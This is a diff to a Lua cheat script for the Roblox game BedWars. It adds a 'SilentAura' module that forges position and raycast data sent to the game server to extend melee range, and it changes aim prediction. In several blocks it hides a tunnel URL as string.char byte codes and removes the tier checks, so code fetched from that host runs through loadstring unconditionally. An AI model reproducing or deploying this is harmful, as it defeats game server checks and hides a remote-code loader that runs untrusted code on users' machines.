@@ -123,6 +123,7 @@ local store = {
 	terraStompTime = 0,
 	terraKickTime = 0,
 }
+getgenv().store = store
 local Reach = {}
 local HitBoxes = {}
 local TrapDisabler
@@ -1026,6 +1027,8 @@ run(function()
 		end
 	})
 
+	getgenv().bedwars = bedwars
+
 	local remoteNames = {
 		AfkStatus = safeGetProto(Knit.Controllers.AfkController.KnitStart, 1),
 		AttackEntity = Knit.Controllers.SwordController.sendServerRequest,
@@ -1143,6 +1146,8 @@ run(function()
 		remotes[i] = remote
 	end
 
+	getgenv().remotes = remotes
+
 	OldBreak = bedwars.BlockController.isBlockBreakable
 
 	Client.Get = function(self, remoteName)
@@ -1167,7 +1172,12 @@ run(function()
 					end
 
 					if suc and plr then
-						-- whitelist removed
+						if getAccountTier(lplr) == 0 and getAccountTier(plr) <= 4 then
+							return
+						end
+						if getAccountTier(plr) >= 99 and getAccountTier(lplr) >= 4 then
+							return
+						end
 					end
 
 					return call:SendToServer(attackTable, ...)
@@ -1223,6 +1233,7 @@ run(function()
 			task.wait(60)
 			if vape.Loaded then
 				table.clear(cache)
+				table.clear(bedtms)
 			end
 		end
 	end)
@@ -6868,7 +6879,7 @@ run(function()
 		if not velocityHistory[id] then
 			velocityHistory[id] = rawVel
 		else
-			velocityHistory[id] = velocityHistory[id]:Lerp(rawVel, 0.45)
+			velocityHistory[id] = velocityHistory[id]:Lerp(rawVel, 0.65)
 		end
 		return velocityHistory[id]
 	end
@@ -7031,8 +7042,12 @@ run(function()
 
 	local function pickRandomPart(character)
 		local roll = math.random(1, 100)
-		if roll <= RandomHeadPercent.Value then
+		local headChance = RandomHeadPercent.Value
+		local torsoChance = RandomTorsoPercent.Value
+		if roll <= headChance then
 			return character:FindFirstChild('Head') or character:FindFirstChild('HumanoidRootPart')
+		elseif roll <= headChance + torsoChance then
+			return character:FindFirstChild('UpperTorso') or character:FindFirstChild('HumanoidRootPart')
 		else
 			return character:FindFirstChild('HumanoidRootPart')
 		end
@@ -7165,7 +7180,7 @@ run(function()
 					local safeOffset = (projmeta.projectile == 'owl_projectile') and Vector3.zero or (projmeta.fromPositionOffset or Vector3.zero)
 					local offsetpos = pos + safeOffset
 					local balloons = plr.Character and plr.Character:GetAttribute('InflatedBalloons')
-					local playerGravity = workspace.Gravity
+					local playerGravity = 0
 					if balloons and balloons > 0 then
 						playerGravity = workspace.Gravity * (1 - (balloons >= 4 and 1.2 or balloons >= 3 and 1 or 0.975))
 					end
@@ -7191,12 +7206,14 @@ run(function()
 						CFrame.new(projmeta.projectile == 'owl_projectile' and Vector3.zero or
 							Vector3.new(bowRelX, bowRelY, bowRelZ))
 
-					local networkLead = lplr:GetNetworkPing()
+					local dist = (aimTarget - newlook.p).Magnitude
+					local networkLead = math.clamp(0.07 + dist * 0.0008, 0.07, 0.18)
 					local calcKey = tostring(plr)
 					smoothedTargetPos[calcKey] = aimTarget
 					local solverVelocity = projmeta.projectile == 'telepearl' and Vector3.zero or rootVelocity
 					if rootVelocity.Magnitude > 0.5 then
-						aimTarget = aimTarget + rootVelocity * networkLead
+						local horzVel = Vector3.new(rootVelocity.X, 0, rootVelocity.Z)
+						aimTarget = aimTarget + horzVel * networkLead
 					end
 					if CustomPrediction and CustomPrediction.Enabled then
 						local hMult = (HorizontalMultiplier and HorizontalMultiplier.Value or 100) / 100
@@ -7207,6 +7224,20 @@ run(function()
 							solverVelocity.Z * hMult
 						)
 					end
+
+					local targetRoot = plr.RootPart
+					if targetRoot then
+						local targetRootVel = targetRoot.AssemblyLinearVelocity or targetRoot.Velocity or Vector3.zero
+						local heightDiff = aimTarget.Y - newlook.p.Y
+						if targetRootVel.Y > 8 then
+							aimTarget = aimTarget + Vector3.new(0, math.clamp(targetRootVel.Y * 0.18, 1.5, 5.5), 0)
+						elseif targetRootVel.Y > 3 then
+							aimTarget = aimTarget + Vector3.new(0, math.clamp(targetRootVel.Y * 0.12, 0.8, 3.0), 0)
+						elseif heightDiff < -8 then
+							aimTarget = aimTarget + Vector3.new(0, math.clamp(math.abs(heightDiff) * 0.04, 0.3, 2.5), 0)
+						end
+					end
+
 					local cacheKey = tostring(plr) .. projmeta.projectile
 					local cached = solveCache[cacheKey]
 					local now = tick()
@@ -7225,7 +7256,7 @@ run(function()
 						end
 						calc = prediction.SolveTrajectory(
 							newlook.p, projSpeed, gravity,
-							aimTarget + Vector3.new(0,lplr:GetNetworkPing(),0),
+							aimTarget,
 							solverVelocity,
 							playerGravity, plr.HipHeight, jumpOverride, rayCheck
 						)
@@ -34772,32 +34803,10 @@ end)
 run(function()	
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+
 		local _secret = ''
 
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
 
 		local oks, ress = pcall(function()
 			return _req({
@@ -34827,33 +34836,8 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
-
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
-
 		local oks, ress = pcall(function()
 			return _req({
 				Url = _baseUrl .. '/getsecret',
@@ -34880,33 +34864,8 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
-
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
-
 		local oks, ress = pcall(function()
 			return _req({
 				Url = _baseUrl .. '/getsecret',
@@ -34933,33 +34892,8 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
-
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
-
 		local oks, ress = pcall(function()
 			return _req({
 				Url = _baseUrl .. '/getsecret',
@@ -34981,40 +34915,13 @@ run(function()
 			})
 		end)
 		if ok2 and res2 and res2.StatusCode == 200 and res2.Body ~= '' then
-			if getAccountTier(lplr) >= 2 then
-				loadstring(res2.Body, 'BackTrack')()
-			end
+			loadstring(res2.Body, 'BackTrack')()
 		end
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
-
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
-
 		local oks, ress = pcall(function()
 			return _req({
 				Url = _baseUrl .. '/getsecret',
@@ -35043,33 +34950,8 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
-
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
-
 
 
 		local oks, ress = pcall(function()
@@ -35098,33 +34980,8 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = ''
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
-
-		local config_URL = 'https://gist.githubusercontent.com/wrj80z/3fd426321a2206a67d6ca55dfb345277/raw/f3a960a20177287b07aa4252a4ab0fa97a8bc7ac/gistfile1.txt'
-		local _liveUrl = (isfile('newvape/profiles/module_server.txt') and readfile('newvape/profiles/module_server.txt'):match('^%s*(.-)%s*$')) or nil
-
-		if _liveUrl then
-			_baseUrl = _liveUrl
-		else
-			local ddsuc, dddres = pcall(function()
-				return _req({
-					Url = config_URL,
-					Method = 'GET',
-					Headers = { ['Cache-Control'] = 'no-cache' }
-				})
-			end)
-			if ddsuc and dddres and dddres.Body and dddres.StatusCode == 200 then
-				local url = dddres.Body:match('^%s*(.-)%s*$')
-				if url ~= '' then
-					_liveUrl = url
-					writefile('newvape/profiles/module_server.txt', _liveUrl)
-					_baseUrl = _liveUrl
-				end
-			end
-
-		end
-
 
 		local oks, ress = pcall(function()
 			return _req({
@@ -35147,9 +35004,192 @@ run(function()
 			})
 		end)
 		if ok2 and res2 and res2.StatusCode == 200 and res2.Body ~= '' then
-			if getAccountTier(lplr) >= 4 then
-				loadstring(res2.Body, 'Autowin')()
-			end
+			loadstring(res2.Body, 'Autowin')()
 		end
 	end)
+end)
+
+run(function()
+	local SilentAura
+	local ExtendedRange
+	local ExtendedRangeSlider
+	local SilentTargets
+	local silentAttackRemote
+	local lastHitTime = 0
+	local BASE_RANGE = 13.8
+
+	task.spawn(function()
+		silentAttackRemote = bedwars.Client:Get(remotes.AttackEntity)
+	end)
+
+	local _saT4HitCount = {}
+	local _saT4HitTick = {}
+
+	local function fireSilentAttack(attackData)
+		if not silentAttackRemote then return end
+		local _atkPlr = playersService:GetPlayerFromCharacter(attackData.entityInstance)
+		if _atkPlr then
+			local targetTier = getAccountTier(_atkPlr)
+			if targetTier >= 99 then return end
+			if targetTier == 4 and getAccountTier(lplr) == 0 then
+				local uid = _atkPlr.UserId
+				local now = tick()
+				if not _saT4HitTick[uid] or now - _saT4HitTick[uid] >= 10 then
+					_saT4HitTick[uid] = now
+					_saT4HitCount[uid] = 0
+				end
+				_saT4HitCount[uid] = (_saT4HitCount[uid] or 0) + 1
+				if _saT4HitCount[uid] > 32 then return end
+			end
+			-- whitelist removed
+		end
+		local selfpos = attackData.validate.selfPosition.value
+		local targetpos = attackData.validate.targetPosition.value
+		local actualDistance = (selfpos - targetpos).Magnitude
+		if actualDistance > 14.4 and actualDistance <= 30 then
+			local direction = (targetpos - selfpos).Unit
+			local moveDistance = math.min(actualDistance - 14.3, 8)
+			attackData.validate.selfPosition.value = selfpos + (direction * moveDistance)
+			local pullDistance = math.min(actualDistance - 14.3, 4)
+			attackData.validate.targetPosition.value = targetpos - (direction * pullDistance)
+			attackData.validate.raycast = attackData.validate.raycast or {}
+			attackData.validate.raycast.cameraPosition = attackData.validate.raycast.cameraPosition or {}
+			attackData.validate.raycast.cursorDirection = attackData.validate.raycast.cursorDirection or {}
+			local extendedOrigin = selfpos + (direction * math.min(actualDistance - 12, 15))
+			attackData.validate.raycast.cameraPosition.value = extendedOrigin
+			attackData.validate.raycast.cursorDirection.value = direction
+		end
+		return silentAttackRemote:SendToServer(attackData)
+	end
+
+	local function getMaxRange()
+		local base = BASE_RANGE
+		if ExtendedRange and ExtendedRange.Enabled and ExtendedRangeSlider then
+			base = base + ExtendedRangeSlider.Value
+		end
+		return base
+	end
+
+	local function canHitWithHitreg()
+		local currentTime = tick()
+		local hitreg = math.random(340, 350) / 10
+		local delayBetweenHits = 10 / hitreg
+		if currentTime - lastHitTime >= delayBetweenHits then
+			lastHitTime = lastHitTime + delayBetweenHits
+			if currentTime - lastHitTime > delayBetweenHits then
+				lastHitTime = currentTime
+			end
+			return true
+		end
+		return false
+	end
+
+	local function gatherSilentTargets(maxRange)
+		local selfpos = entitylib.character.RootPart.Position
+		local facing = entitylib.character.RootPart.CFrame.LookVector * Vector3.new(1, 0, 1)
+		local maxAngle = math.rad(105) / 2
+		local all = entitylib.AllPosition({
+			Range = maxRange,
+			Wallcheck = SilentTargets and SilentTargets.Walls.Enabled or nil,
+			Part = 'RootPart',
+			Players = SilentTargets and SilentTargets.Players.Enabled or true,
+			NPCs = SilentTargets and SilentTargets.NPCs.Enabled or true,
+			Sort = sortmethods['Distance']
+		})
+		local filtered = {}
+		for _, v in all do
+			local flat = (v.RootPart.Position - selfpos) * Vector3.new(1, 0, 1)
+			if flat.Magnitude > 0.01 and math.acos(math.clamp(facing.Unit:Dot(flat.Unit), -1, 1)) <= maxAngle then
+				table.insert(filtered, v)
+				if #filtered >= 2 then break end
+			end
+		end
+		return filtered
+	end
+
+	SilentAura = vape.Categories.Combat:CreateModule({
+		Name = 'SilentAura(aero - testing)',
+		Function = function(callback)
+			if not callback then return end
+			task.spawn(function()
+				repeat
+					task.wait(1 / 60)
+					if not SilentAura.Enabled then break end
+
+					if (tick() - bedwars.SwordController.lastSwing) > 0.2 then continue end
+
+					local ok, open = pcall(function() return bedwars.AppController:isLayerOpen(bedwars.UILayers.MAIN) end)
+					if ok and open then continue end
+
+					if tick() - store.silasAbilityTime < 2.2 then continue end
+					if tick() - store.terraStompTime < 0.7 then continue end
+					if tick() - store.terraKickTime < 0.5 then continue end
+
+					if store.hand.toolType ~= 'sword' then continue end
+					if bedwars.DaoController and bedwars.DaoController.chargingMaid then continue end
+
+					local sword = store.hand
+					if not sword or not sword.tool then continue end
+					local meta = bedwars.ItemMeta[sword.tool.Name]
+					if not meta or not meta.sword then continue end
+
+					if not entitylib.isAlive then continue end
+					local selfpos = entitylib.character.RootPart.Position
+
+					local maxRange = getMaxRange()
+					local targets = gatherSilentTargets(maxRange)
+					if #targets == 0 then continue end
+
+					if not canHitWithHitreg() then continue end
+
+					local ent = targets[1]
+					if not ent.RootPart then continue end
+
+					local targetPos = ent.RootPart.Position
+					local camPos = gameCamera.CFrame.Position
+					local dir = (targetPos - camPos).Unit
+
+					fireSilentAttack({
+						weapon = sword.tool,
+						entityInstance = ent.Character,
+						chargedAttack = {chargeRatio = 0},
+						validate = {
+							raycast = {
+								cameraPosition = {value = camPos},
+								cursorDirection = {value = dir}
+							},
+							targetPosition = {value = targetPos},
+							selfPosition = {value = selfpos}
+						}
+					})
+				until not SilentAura.Enabled
+			end)
+		end
+	})
+
+	SilentTargets = SilentAura:CreateTargets({
+		Players = true,
+		NPCs = true
+	})
+
+	ExtendedRange = SilentAura:CreateToggle({
+		Name = 'Extended Range',
+		Function = function(callback)
+			if ExtendedRangeSlider then
+				ExtendedRangeSlider.Object.Visible = callback
+			end
+		end
+	})
+
+	ExtendedRangeSlider = SilentAura:CreateSlider({
+		Name = 'Extend Range',
+		Min = 1,
+		Max = 3,
+		Default = 1,
+		Darker = true,
+		Visible = false,
+		Suffix = function(val)
+			return val == 1 and 'stud' or 'studs'
+		end
+	})
 end)
